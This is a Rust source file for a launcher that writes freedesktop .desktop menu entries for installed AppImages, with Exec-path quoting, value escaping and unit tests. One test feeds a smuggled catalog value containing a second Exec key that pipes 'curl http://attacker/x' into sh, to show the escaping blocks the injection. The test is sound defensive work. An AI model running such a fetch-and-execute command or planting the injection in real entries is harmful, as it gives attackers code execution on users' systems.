//! Menu entries (freedesktop `.desktop` files) for AppImages the launcher installs.
//!
//! An AppImage installs nothing by itself, so without an entry the app is missing from the
//! desktop's menu and, on Wayland, the dock can't match the window's app id to an icon. The
//! launcher writes `<data>/applications/com.bdtecnologia.<app>.desktop` (the id each app's window
//! reports) and marks it as its own, so it only ever replaces or removes entries it wrote.
//!
//! The text is built by pure functions, tested on every platform; only Linux writes the files.

#![cfg_attr(not(target_os = "linux"), allow(dead_code))]

use std::path::Path;

use bd_launcher_core::App;

/// The key that marks an entry as written by the launcher.
pub const MARKER: &str = "X-BD-Launcher=true";

/// The menu categories and the window class each app's own `.desktop` file declares. The
/// catalog says both; the package id stands in for the window class when it doesn't.
pub fn meta(app: &App) -> (String, Option<String>) {
    let categories = if app.categories.is_empty() { "Utility;".to_string() } else { app.categories.clone() };
    let wm_class = (!app.wm_class.is_empty()).then(|| app.wm_class.clone());
    (categories, wm_class)
}

/// `path` as one quoted argument of an `Exec=` key, per the Desktop Entry spec: inside double
/// quotes `"`, `` ` ``, `$` and `\` take a backslash, then the string-value rule doubles every
/// backslash, and `%` (field codes) is written `%%`. `None` for paths that can't be written
/// safely (not UTF-8, or holding a control character such as a line break).
pub fn exec_quote(path: &Path) -> Option<String> {
    let s = path.to_str()?;
    if s.chars().any(char::is_control) {
        return None;
    }
    let mut out = String::with_capacity(s.len() + 2);
    out.push('"');
    for c in s.chars() {
        match c {
            '"' | '`' | '$' => {
                out.push_str("\\\\");
                out.push(c);
            }
            '\\' => out.push_str("\\\\\\\\"),
            '%' => out.push_str("%%"),
            c => out.push(c),
        }
    }
    out.push('"');
    Some(out)
}

/// A localestring/string value: backslashes and line breaks escaped.
fn value(s: &str) -> String {
    s.replace('\\', "\\\\").replace('\n', "\\n").replace('\r', "\\r").replace('\t', "\\t")
}

/// The entry for `app` installed as the AppImage `appimage`; `icon` when its icon is installed
/// under the app's id. `None` when the path can't be put in an `Exec=` line, or when a value
/// the catalog supplied can't be written safely.
pub fn render(app: &App, appimage: &Path, icon: bool) -> Option<String> {
    let exec = exec_quote(appimage)?;
    let (categories, wm_class) = meta(app);
    // Every value the catalog supplies goes through the string-value escaping: a newline in
    // one would otherwise start a new key (notably a second `Exec=`), which the desktop
    // would then run.
    let mut text = String::from("[Desktop Entry]\nType=Application\n");
    text.push_str(&format!("Name={}\n", value(&app.name)));
    text.push_str(&format!("Comment={}\n", value(&app.tagline)));
    text.push_str(&format!("Exec={exec} %F\n"));
    if icon {
        text.push_str(&format!("Icon={}\n", value(&app.bundle_id())));
    }
    text.push_str("Terminal=false\n");
    text.push_str(&format!("Categories={}\n", value(&categories)));
    text.push_str(&format!("StartupWMClass={}\n", value(&wm_class.unwrap_or_else(|| app.bundle_id()))));
    text.push_str(MARKER);
    text.push('\n');
    Some(text)
}

/// Whether the launcher wrote this entry.
pub fn is_ours(text: &str) -> bool {
    text.lines().any(|l| l.trim() == MARKER)
}

/// The program an entry's `Exec=` runs: its first argument, unquoted. Reads the launcher's own
/// quoting and the plain `Exec="<path>" %F` the apps' AppImages write for themselves.
pub fn exec_program(text: &str) -> Option<String> {
    let line = text.lines().find_map(|l| l.strip_prefix("Exec="))?;
    // String-value escapes first, then the quoting rule.
    let mut unescaped = String::with_capacity(line.len());
    let mut chars = line.chars();
    while let Some(c) = chars.next() {
        if c == '\\' {
            match chars.next() {
                Some('s') => unescaped.push(' '),
                Some('n') => unescaped.push('\n'),
                Some('t') => unescaped.push('\t'),
                Some('r') => unescaped.push('\r'),
                Some(other) => unescaped.push(other),
                None => unescaped.push('\\'),
            }
        } else {
            unescaped.push(c);
        }
    }
    let mut out = String::new();
    let mut chars = unescaped.trim_start().chars();
    if unescaped.trim_start().starts_with('"') {
        chars.next();
        loop {
            match chars.next()? {
                '"' => break,
                '\\' => out.push(chars.next()?),
                c => out.push(c),
            }
        }
    } else {
        out.extend(chars.take_while(|c| !c.is_whitespace()));
    }
    Some(out.replace("%%", "%"))
}

#[cfg(test)]
mod tests {
    use std::path::PathBuf;

    use super::*;

    fn app(id: &str) -> &App {
        crate::testing::app(id)
    }

    #[test]
    fn a_hostile_catalog_value_cannot_inject_a_second_exec_key() {
        let mut app = crate::testing::app("photocraft").clone();
        app.wm_class = "x\nExec=/bin/sh -c 'curl http://attacker/x|sh'\nNoDisplay=false".to_string();
        app.categories = "Utility;Evil\nExec=x;".to_string();
        let text = render(&app, Path::new("/x/a.AppImage"), true).unwrap();
        let exec_keys = text.lines().filter(|l| l.starts_with("Exec=")).count();
        assert_eq!(exec_keys, 1, "only the launcher's own Exec= may exist:\n{text}");
        assert!(text.contains("\\nExec="), "the newline must be escaped, not a line break:\n{text}");
    }

    #[test]
    fn writes_a_complete_entry() {
        let text = render(app("photocraft"), Path::new("/home/ana/Applications/photocraft-0.6.0-linux-x86_64.AppImage"), true).unwrap();
        let expected = format!(
            "[Desktop Entry]\nType=Application\nName=PhotoCraft\nComment={}\n\
             Exec=\"/home/ana/Applications/photocraft-0.6.0-linux-x86_64.AppImage\" %F\n\
             Icon=com.bdtecnologia.photocraft\nTerminal=false\nCategories=Utility;\n\
             StartupWMClass=com.bdtecnologia.photocraft\nX-BD-Launcher=true\n",
            app("photocraft").tagline
        );
        assert_eq!(text, expected);
        assert!(is_ours(&text));
        let no_icon = render(app("wordcraft"), Path::new("/x/w.AppImage"), false).unwrap();
        assert!(!no_icon.contains("Icon="));
        assert!(no_icon.contains("StartupWMClass=com.bdtecnologia.wordcraft\n"));
        assert!(no_icon.contains("Categories=Utility;\n"));
    }

    #[test]
    fn quotes_exec_paths_per_the_spec() {
        assert_eq!(exec_quote(Path::new("/home/ana/My Apps/p.AppImage")).unwrap(), "\"/home/ana/My Apps/p.AppImage\"");
        assert_eq!(exec_quote(Path::new("/a/\"q\" $HOME `x`.AppImage")).unwrap(), r#""/a/\\"q\\" \\$HOME \\`x\\`.AppImage""#);
        assert_eq!(exec_quote(Path::new(r"/a\b/100%.AppImage")).unwrap(), r#""/a\\\\b/100%%.AppImage""#);
        assert_eq!(exec_quote(Path::new("/a/line\nbreak.AppImage")), None);
        assert!(render(app("photocraft"), Path::new("/a/line\nbreak.AppImage"), true).is_none());
    }

    #[test]
    fn reads_back_the_program_it_wrote_and_the_apps_own_entries() {
        for p in ["/home/ana/My Apps/p.AppImage", "/a/\"q\" $HOME `x`.AppImage", r"/a\b/100%.AppImage", "/plain.AppImage"] {
            let text = render(app("gridcraft"), Path::new(p), false).unwrap();
            assert_eq!(exec_program(&text).map(PathBuf::from), Some(PathBuf::from(p)), "{p}");
        }
        // PhotoCraft's AppRun writes its own entry, unmarked.
        let theirs = "[Desktop Entry]\nName=PhotoCraft\nExec=\"/home/ana/Applications/photocraft-0.5.0-linux-x86_64.AppImage\" %F\n";
        assert_eq!(exec_program(theirs).as_deref(), Some("/home/ana/Applications/photocraft-0.5.0-linux-x86_64.AppImage"));
        assert!(!is_ours(theirs));
        assert_eq!(exec_program("[Desktop Entry]\nExec=photocraft %F\n").as_deref(), Some("photocraft"));
        assert_eq!(exec_program("[Desktop Entry]\nName=x\n"), None);
    }
}
